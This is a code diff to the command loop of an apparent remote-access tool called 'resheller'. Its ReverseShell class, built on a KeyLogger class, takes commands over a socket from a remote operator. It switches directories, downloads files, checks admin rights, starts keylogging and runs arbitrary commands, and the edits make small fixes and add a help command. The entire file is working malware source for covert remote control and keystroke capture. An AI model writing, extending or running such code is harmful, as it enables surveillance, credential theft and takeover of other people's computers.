@@ -13,7 +13,7 @@ from requests import get
 
 from resheller.src.client.ip import get_ip
 from resheller.src.client.keylogger import KeyLogger
-from resheller.src.pipe.safe_socket import SafeSocket
+from resheller.src.server.pipe import SafeSocket
 from resheller.src.stdout.output import usage
 
 
@@ -128,15 +128,17 @@ class ReverseShell(KeyLogger):
         self.safe_sock.send(payload)
 
     def shell(self):
+        windows = (name == "nt")
         while True:
             command = self.safe_sock.recv()
             if command == "get_os":
-                windows = (name == "nt")
                 self.safe_sock.send(windows)
             elif command == "exit":
                 self.sock.close()
                 break
             elif command[:2] == 'cd' and len(command) > 2:
+                if command == "cd ~":
+                    command = f"cd {path.expanduser('~')}"
                 self.change_dir(command)
             elif command[:8] == "download":
                 self.download(command)
@@ -150,6 +152,8 @@ class ReverseShell(KeyLogger):
                 self.is_admin()
             elif command[:9] == "keylogger":
                 self.keylogger(command)
+            elif command == "help":
+                return usage()
             else:
                 self.return_proc(command)
 
